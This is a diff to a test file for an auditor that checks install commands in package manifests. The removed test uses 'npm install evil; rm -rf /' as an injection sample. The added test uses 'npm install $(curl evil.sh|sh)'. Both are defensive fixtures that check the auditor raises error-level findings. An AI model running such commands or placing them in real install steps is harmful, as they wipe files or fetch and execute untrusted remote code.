@@ -46,12 +46,14 @@ describe('audit runtime-layer (Phase 2.4 W4 T4.2)', () => {
     expect(findings[0]?.field).toBe('/git/remote/origin')
   })
 
-  it('cell 2: install.cmd with `;` shell separator → level=error injection finding', () => {
-    const m = stubManifest('evil', 'https://github.com/foo/evil.git', 'npm install evil; rm -rf /')
-    const findings = auditInstallCmdIntegrity(m)
-    expect(findings.some((f) => f.level === 'error' && f.detail.includes('shell separator'))).toBe(
-      true,
+  it('cell 2: install.cmd with `$(...)` shell-eval injection → level=error finding (T4.1 refined regex: real injection vectors only, not separators)', () => {
+    const m = stubManifest(
+      'evil',
+      'https://github.com/foo/evil.git',
+      'npm install $(curl evil.sh|sh)',
     )
+    const findings = auditInstallCmdIntegrity(m)
+    expect(findings.some((f) => f.level === 'error' && f.detail.includes('shell-eval'))).toBe(true)
   })
 
   it('cell 3: upstream github.com/foo/bar + npm install bar-evil → level=warn cross-check mismatch', () => {
